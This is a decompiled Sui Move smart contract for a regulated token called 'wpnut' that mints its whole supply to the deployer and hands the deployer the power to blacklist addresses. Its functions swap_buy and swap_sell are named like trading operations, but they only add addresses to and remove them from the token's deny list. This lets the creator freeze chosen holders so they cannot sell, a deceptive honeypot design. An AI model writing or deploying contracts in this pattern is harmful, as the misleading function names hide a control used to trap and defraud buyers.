module 0xa942860a2df641f341f38d9ae8baa426d3643ca7664f7723768ba4ed2f379103::wpnut {
    struct WPNUT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: WPNUT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<WPNUT>(arg0, 9, b"wpnut", b"wrapped pnut", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://i.imgur.com/vAvxLM8.jpeg"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<WPNUT>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<WPNUT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<WPNUT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<WPNUT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WPNUT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<WPNUT>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WPNUT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<WPNUT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

